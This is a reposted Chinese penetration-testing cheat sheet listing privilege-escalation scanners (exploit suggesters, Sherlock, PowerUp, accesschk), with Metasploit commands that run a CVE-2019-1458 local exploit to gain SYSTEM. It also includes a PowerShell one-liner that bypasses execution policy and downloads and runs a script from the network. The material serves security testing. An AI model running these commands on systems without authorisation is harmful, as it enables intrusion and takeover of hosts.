---
title: 干货|提权扫描工具一览
url: https://buaq.net/go-155109.html
source: unSafe.sh - 不安全
date: 2023-03-25
fetch_date: 2025-10-04T10:36:21.079639
---

# 干货|提权扫描工具一览

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

干货|提权扫描工具一览

使用Windows-Exploit-Suggester解析systeminfohttps://github.com/AonCyberLabs/Windows-Exploit-Sugge
*2023-3-24 17:35:36
Author: [www.secpulse.com(查看原文)](/jump-155109.htm)
阅读量:59
收藏*

---

## 使用Windows-Exploit-Suggester解析systeminfo

https://github.com/AonCyberLabs/Windows-Exploit-Suggester

```
./windows-exploit-suggester.py
```

## 使用Linux-Exploit-Suggester.sh寻找linux提权问题

https://github.com/mzet-/linux-exploit-suggester

```
./linux-exploit-suggester.sh
```

## 使用Sherlock

https://github.com/rasta-mouse/Sherlock

```
Import-Module Sherlock.ps1
Find-AllVulns
```

## 使用msf查询补丁和可利用提权漏洞

```
# 查询补丁meterpreter> run post/windows/gather/enum_patches [+] KB2999226 installed on 11/25/2020[+] KB976902 installed on 11/21/2010
# 查询Expmsf> use post/multi/recon/local_exploit_suggester msf> set LHOST <攻击机IP>msf> set SESSION <session_id>msf> run
# 利用示例msf> use exploit/windows/local/cve_2019_1458_wizardopium msf> set SESSION <session_id>msf> runmeterpreter> getuidServer username: NT AUTHORITYSYSTEM
```

## 使用powerup检查提权漏洞

```
powershell.exe -exec bypass -Command "& {Import-Module .PowerUp.ps1;
Invoke-AllChecks}"
powershell.exe -nop -exec bypass -c "IEX (New-object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-
AllChecks"
```

## 使用accesschk.exe对系统扫描发现高权限可执行程序，且能够被低权限用户更改

```
accesschk "d:dir"查看所有用户在d盘dir路径的子路径的权限
accesschk "Administrator "d:dir"查看Administrator用户在d盘dir路径的子路径的权限
accesschk Administrators -c *查看Administrators组对所有服务的权限
accesschk -k Guest hklmsoftware查看Guest用户对hklmsoftware注册表的权限
accesschk -ou User查看User用户对全局对象的权限
```

**转自Leticia's Blog**

**侵权请私聊公众号（****LemonSec****）删文**

**本文作者：[Lemon](https://www.secpulse.com/archives/newpage/author?author_id=5109)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/198190.html**](https://www.secpulse.com/archives/198190.html)

文章来源: https://www.secpulse.com/archives/198190.html
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)